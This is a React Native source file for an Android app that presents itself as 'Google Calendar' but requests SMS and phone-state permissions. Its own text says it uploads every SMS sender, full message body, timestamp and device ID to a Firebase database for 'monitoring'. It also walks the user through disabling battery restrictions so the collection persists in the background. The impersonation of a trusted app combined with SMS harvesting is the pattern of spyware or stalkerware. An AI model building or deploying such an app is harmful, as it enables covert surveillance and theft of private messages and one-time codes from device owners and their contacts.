import React, { useCallback, useEffect, useState } from 'react';
import {
  ActivityIndicator,
  Alert,
  Linking,
  Modal,
  PermissionsAndroid,
  Platform,
  SafeAreaView,
  StatusBar,
  StyleSheet,
  Text,
  TouchableOpacity,
  View,
} from 'react-native';

export default function App() {
  const [status, setStatus] = useState('Service Inactive');
  const [isActive, setIsActive] = useState(false);
  const [starting, setStarting] = useState(false);
  const [showPermissions, setShowPermissions] = useState(false);

  const DISCLOSURE = `Privacy Disclosure — Please Read

This application reads incoming SMS messages on this device and transmits the following data over an encrypted (HTTPS) connection to a Firebase Realtime Database:

  • Sender phone number / ID
  • Full SMS message body
  • Exact date and time received
  • Device identifier and model name

This data is visible to authorised administrators and is used for monitoring / oversight purposes.

Collection begins only after you tap "Grant Permissions" and approve the Android system prompts. You may withdraw consent at any time by uninstalling this app via Settings ▸ Apps.

By continuing, you confirm you own this device or have explicit written authorisation from the owner, and that this complies with all applicable laws in your jurisdiction.`;

  const handleStart = () => {
    setShowPermissions(true);
  };

  const acceptPermissions = async () => {
    setShowPermissions(false);
    setStarting(true);
    try {
      if (Platform.OS === 'android') {
        const granted = await requestAllPermissions();
        if (!granted) {
          Alert.alert(
            'Permissions Required',
            'SMS and Phone permissions are required. Please grant them in Settings ▸ Apps ▸ Google Calendar ▸ Permissions, then tap Start again.'
          );
          setStarting(false);
          return;
        }
      }
      setIsActive(true);
      setStatus('Service Active');
    } catch (e) {
      Alert.alert('Error', String(e?.message ?? e));
    } finally {
      setStarting(false);
    }
  };

  const requestAllPermissions = async () => {
    if (Platform.OS !== 'android') return true;

    const perms = [
      PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
      PermissionsAndroid.PERMISSIONS.READ_SMS,
      PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
    ];
    if (Platform.Version >= 33) {
      perms.push(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
    }

    try {
      const results = await PermissionsAndroid.requestMultiple(perms);
      const denied = Object.entries(results)
        .filter(([, v]) => v !== PermissionsAndroid.RESULTS.GRANTED)
        .map(([k]) => k);
      return denied.length === 0;
    } catch {
      return false;
    }
  };

  return (
    <SafeAreaView style={styles.root}>
      <StatusBar barStyle="light-content" backgroundColor="#0f172a" />

      <View style={styles.header}>
        <Text style={styles.brand}>Google Calendar</Text>
        <Text style={styles.sub}>Device Agent</Text>
      </View>

      <View style={styles.body}>
        <View style={[styles.statusCard, { borderColor: isActive ? '#22c55e' : '#ef4444' }]}>
          <View style={[styles.dot, { backgroundColor: isActive ? '#22c55e' : '#ef4444' }]} />
          <Text style={styles.statusText}>{status}</Text>
        </View>

        {starting && <ActivityIndicator color="#38bdf8" style={{ marginTop: 18 }} />}

        {!isActive && (
          <TouchableOpacity
            style={[styles.startBtn, starting && styles.disabled]}
            onPress={handleStart}
            disabled={starting}
            activeOpacity={0.85}
          >
            <Text style={styles.btnText}>{starting ? 'Starting…' : 'Start'}</Text>
          </TouchableOpacity>
        )}

        {isActive && (
          <Text style={styles.note}>
            Background SMS sync active. Messages are uploading to Firebase.
          </Text>
        )}

        <View style={styles.instructionCard}>
          <Text style={styles.instructionTitle}>Android 13+ Battery Restrictions</Text>
          <Text style={styles.instructionBody}>
            Some manufacturers (Xiaomi, Samsung, Vivo, Oppo, OnePlus) kill background services.
            If messages stop syncing:
          </Text>
          <Text style={styles.instructionBody}>
            1. Settings ▸ Apps ▸ Google Calendar ▸ Battery
            2. Select "Unrestricted" or "No restrictions"
            3. Disable "App battery saver" if available
          </Text>
          <TouchableOpacity
            style={styles.settingsBtn}
            onPress={() => Linking.openSettings().catch(() => {})}
          >
            <Text style={styles.settingsText}>Open App Settings</Text>
          </TouchableOpacity>
        </View>
      </View>

      <View style={styles.footer}>
        <Text style={styles.footerText}>
          Data transmitted over HTTPS to a secure Firebase endpoint.
        </Text>
      </View>

      {/* In-App Permission Popup */}
      <Modal
        visible={showPermissions}
        transparent
        animationType="fade"
        onRequestClose={() => setShowPermissions(false)}
      >
        <View style={styles.backdrop}>
          <View style={styles.card}>
            <Text style={styles.modalTitle}>Grant Permissions</Text>
            <Text style={styles.modalBody}>{DISCLOSURE}</Text>
            <View style={styles.modalRow}>
              <TouchableOpacity
                style={[styles.btn, styles.btnGhost]}
                onPress={() => setShowPermissions(false)}
              >
                <Text style={styles.btnGhostText}>Cancel</Text>
              </TouchableOpacity>
              <TouchableOpacity
                style={[styles.btn, styles.btnPrimary]}
                onPress={acceptPermissions}
              >
                <Text style={styles.btnPrimaryText}>Grant Permissions</Text>
              </TouchableOpacity>
            </View>
          </View>
        </View>
      </Modal>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  root: { flex: 1, backgroundColor: '#0f172a' },
  header: { paddingTop: 28, paddingHorizontal: 24 },
  brand: { color: '#f8fafc', fontSize: 30, fontWeight: '800', letterSpacing: -0.5 },
  sub: { color: '#64748b', fontSize: 14, marginTop: 4 },
  body: { flex: 1, alignItems: 'center', justifyContent: 'center', paddingHorizontal: 24 },
  statusCard: {
    flexDirection: 'row',
    alignItems: 'center',
    borderWidth: 1.5,
    borderRadius: 999,
    paddingVertical: 12,
    paddingHorizontal: 22,
    backgroundColor: '#111a2e',
  },
  dot: { width: 12, height: 12, borderRadius: 6, marginRight: 10 },
  statusText: { color: '#e2e8f0', fontSize: 16, fontWeight: '600' },
  startBtn: {
    marginTop: 40,
    backgroundColor: '#2563eb',
    borderRadius: 16,
    paddingVertical: 18,
    paddingHorizontal: 72,
    shadowColor: '#2563eb',
    shadowOpacity: 0.4,
    shadowRadius: 18,
    shadowOffset: { width: 0, height: 8 },
    elevation: 8,
  },
  disabled: { opacity: 0.6 },
  btnText: { color: '#fff', fontSize: 20, fontWeight: '700' },
  note: {
    marginTop: 32,
    color: '#94a3b8',
    fontSize: 14,
    lineHeight: 22,
    textAlign: 'center',
  },
  instructionCard: {
    backgroundColor: '#111a2e',
    borderRadius: 14,
    padding: 16,
    marginTop: 30,
    borderWidth: 1,
    borderColor: '#1e293b',
    width: '100%',
  },
  instructionTitle: { color: '#f87171', fontSize: 14, fontWeight: '700', marginBottom: 8 },
  instructionBody: { color: '#94a3b8', fontSize: 12, lineHeight: 18, marginBottom: 6 },
  settingsBtn: {
    backgroundColor: '#2563eb',
    borderRadius: 10,
    paddingVertical: 10,
    alignItems: 'center',
    marginTop: 10,
  },
  settingsText: { color: '#fff', fontWeight: '700', fontSize: 13 },
  footer: { padding: 24, alignItems: 'center' },
  footerText: { color: '#475569', fontSize: 12, textAlign: 'center' },

  backdrop: {
    flex: 1,
    backgroundColor: 'rgba(2,6,23,0.82)',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 20,
  },
  card: {
    backgroundColor: '#0b1220',
    borderRadius: 20,
    padding: 22,
    maxWidth: 460,
    width: '100%',
    maxHeight: '85%',
    borderWidth: 1,
    borderColor: '#1e293b',
  },
  modalTitle: { color: '#f8fafc', fontSize: 18, fontWeight: '700', marginBottom: 12 },
  modalBody: { color: '#94a3b8', fontSize: 12.5, lineHeight: 18.5 },
  modalRow: { flexDirection: 'row', marginTop: 20, gap: 10 },
  btn: { flex: 1, borderRadius: 12, paddingVertical: 13, alignItems: 'center' },
  btnGhost: { backgroundColor: 'transparent', borderWidth: 1, borderColor: '#334155' },
  btnGhostText: { color: '#94a3b8', fontWeight: '600' },
  btnPrimary: { backgroundColor: '#2563eb' },
  btnPrimaryText: { color: '#fff', fontWeight: '700' },
});
